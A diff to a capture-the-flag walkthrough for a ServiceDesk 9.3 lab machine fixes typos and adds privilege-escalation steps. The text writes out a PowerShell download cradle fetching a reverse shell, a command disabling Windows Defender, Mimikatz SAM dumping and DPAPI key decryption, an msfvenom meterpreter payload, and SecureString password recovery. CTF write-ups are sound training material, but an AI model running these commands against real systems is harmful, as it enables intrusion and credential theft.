@@ -44,7 +44,7 @@ searchsploit servicedesk 9.3
 ```
 
 There are some exploits for this software. The privilege escalation exploit _exploits/jsp/webapps/46659.py_ looks good but first we need a username.
-If we google for default users for this software, we will get result or another way is to get valid usernames with fuzzing:
+If we google for default users for this software, we will get results or another way is to get valid usernames with fuzzing:
 
 ```markdown
 wfuzz -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt -u 'http://10.10.10.132:8080/domainServlet/AJaxDomainServlet?action=searchLocalAuthDomain&timestamp=Sun%20Aug%2025%202019%2015:42:43%20GMT+0200%20(CEST)&search=FUZZ'
@@ -79,11 +79,11 @@ Match criteria: Sender is not whatever
 Action Type: Execute Script: cmd /c powershell -c IEX(New-Object Net.WebClient).downloadString('http://10.10.13.230/shell.ps1')
 ```
 
-_Shell.ps1_ is just the standard reverse shell from Nishand called _Invoke-PowerShellTcp.ps1_.
-It is important that there is only one trugger or else it won't work well.
+_Shell.ps1_ is just the standard reverse shell from Nishang called _Invoke-PowerShellTcp.ps1_.
+It is important that there is only one trigger or else it won't work well.
 
 Optional:
-> We can minimize the types of characters we are sending, to not get into a input filter:
+> We can minimize the types of characters we are sending, to not get blocked by an input filter:
 
 ```markdown
 Base64 decode command:
@@ -97,8 +97,7 @@ After listening the port 9001 (which I choose in shell.ps1) we get a reverse she
 
 ## Privilege Escalation
 
-Now as we have a shell on the box lets try to increase our privileges. We are logged in as **NT Authority/SYSTEM** but can
-t read any flags. With the following command we can see what is wrong with that:
+Now as we have a shell on the box lets try to increase our privileges. We are logged in as **NT Authority/SYSTEM** but can't read any flags. With the following command we can see why:
 
 ```markdown
 cipher /c C:\Users\Administrator\Desktop\root.txt
@@ -116,7 +115,7 @@ Interesting files:
 - C:\Users\tolu\Desktop\user.txt
   - Only _tolu_ can decrypt it
 - C:\Users\leo\Desktop\admin-pass.xml
-  - Only leo can decrypt it
+  - Only _leo_ can decrypt it
   
 So this means that we actually have to decrypt some stuff. In that case we drop Mimikatz on the box:
 
@@ -124,16 +123,16 @@ So this means that we actually have to decrypt some stuff. In that case we drop 
 IWR -uri hxxp://10.10.13.230/mimikatz.exe -outfile mimikatz.exe
 ```
 
-Execution of this won*t work because of Windows Defender but we can disable that quickly:
+Execution of this won't work because of Windows Defender but we can disable that quickly:
 
 ```markdown
 Set-MpPreference -DisableRealTimeMonitoring $true
 ```
 
-Now dump NTLM passwords:
+Now dump the NTLM passwords:
 
 ```markdown
-.\mimikatz “token::elevate” “lsadump:sam” “exit”
+.\mimikatz "token::elevate" "lsadump:sam" "exit"
 ```
 
 Here are the hashes we get and want to crack or look for:
@@ -188,7 +187,7 @@ Getting the certificate:
 .\mimikatz "crypto::system /file:C:\Users\tolu\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\91EF5D08D1F7C60AA0E4CEE73E050639A6692F29 /export" "exit"
 ```
 
-We now have the certificate the its **public key** as a .der file. Get this on our client with a SMB server:
+We now have the certificates **public key** as a .der file. Get this on our client with a SMB server:
 
 ```markdown
 impacket-smbserver -smb2support -user test -password test test $(pwd)
@@ -197,3 +196,87 @@ Copy the file to our machine:
 net use Y: \\10.10.13.230\test /user:test test
 copy 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der Y:
 ```
+
+Now we need to decrypt the private key. Location of private key (hidden file):
+> C:\Users\tolu\appdata\roaming\microsoft\protect\S-1-5-21-3107372852-1132949149-763516304-1011\2f452fc5-c6d2-4706-a4f7-1cd6b891c017
+
+Decrypting the masterkey:
+```markdown
+.\mimikatz "dpapi::masterkey /in:C:\Users\tolu\appdata\roaming\microsoft\protect\S-1-5-21-3107372852-1132949149-763516304-1011\2f452fc5-c6d2-4706-a4f7-1cd6b891c017 /password:!zaq1234567890pl!99" "exit"
+```
+
+The SHA1 masterkey gets displayed:
+> 8ece5985210c26ecf3dd9c53a38fc58478100ccb
+
+Decrypting the private key:
+```markdown
+.\mimikatz "dpapi::capi /in:C:\Users\tolu\appdata\roaming\microsoft\crypto\rsa\S-1-5-21-3107372852-1132949149-763516304-1011\307da0c2172e73b4af3e45a97ef0755b_86f90bf3-9d4c-47b0-bc79-380521b14c85 /masterkey:8ece5985210c26ecf3dd9c53a38fc58478100ccb" "exit"
+```
+
+This gives us the file **raw_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.pvk** that we need on our machine.
+
+#### Building the PFX
+
+We have the .der and .pvk file on our machine we can build the certificate with OpenSSL:
+
+```markdown
+openssl x509 -inform DER -outform PEM -in 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der -out public.pem
+openssl rsa -inform PVK -outform PEM -in raw_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.pvk -out private.pem
+openssl pkcs12 -in public.pem -inkey private.pem -password pass:mimikatz -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+```
+
+Upload that PFX file on the Windows box and install it:
+```markdown
+certutil -user -p mimikatz -importpfx cert.pfx NoChain,NoRoot
+```
+
+user.txt is now readable!
+
+### Getting root.txt
+
+As we need the password of _Administrator_ we first need to become _leo_ as he can read the **admin-pass.xml** file. After some enumeration you will see that the user _leo_ is actually online on the box so we can take over his session.
+
+Lets create a payload:
+```markdown
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.13.230 LPORT=9001 -f exe -o msf.exe
+```
+
+This payload needs to get uploaded on the box and we will start a listener with Metasploit:
+```markdown
+msfconsole
+
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LPORT 9001
+set LHOST tun0
+run
+```
+
+After starting the listener we execute the payload on the box and wait for a connection. The connection will give us a **meterpreter** session.
+
+In this sessions we need to **migrate** the process to explorer.exe and then we can start a **shell**.
+There we can read the file **admin-pass.xml** and it displays:
+> 01000000d08c9ddf0115d1118c7a00c04fc297eb01000000f2fefa98a0d84f4b917dd8a1f5889c8100000000020000000000106600000001000020000000c2d2dd6646fb78feb6f7920ed36b0ade40efeaec6b090556fe6efb52a7e847cc000000000e8000000002000020000000c41d656142bd869ea7eeae22fc00f0f707ebd676a7f5fe04a0d0932dffac3f48300000006cbf505e52b6e132a07de261042bcdca80d0d12ce7e8e60022ff8d9bc042a437a1c49aa0c7943c58e802d1c758fc5dd340000000c4a81c4415883f937970216c5d91acbf80def08ad70a02b061ec88c9bb4ecd14301828044fefc3415f5e128cfb389cbe8968feb8785914070e8aebd6504afcaa
+
+This is the output of a _secure string_ in PowerShell. So we need to **load powershell** on our session or just start powershell manually. With the following commands we can convert the string as the password:
+
+```markdown
+$pw = gc admin-pass.xml | convertto-securestring
+$cred = new-object system.management.automation.pscredential("administrator", $pw)
+$cred.getnetworkcredential() | fl *
+```
+
+We get the password of Administrator:
+> mb@letmein@SERVER#acc
+
+With this we can execute commands as Administrator:
+```markdown
+Invoke-Command -Computername helpline -Credential $cred -Scriptblock { whoami }
+```
+
+The command _whoami_ works and that means we can read root.txt. The reason we use **CredSSP** in the next command is because of the double hop problem when remoting with Powershell:
+```markdown
+Invoke-Command -Computername helpline -Credential $cred -Authentication CredSSP -Scriptblock { type C:\users\administrator\desktop\root.txt }
+```
+
+We get root.txt!
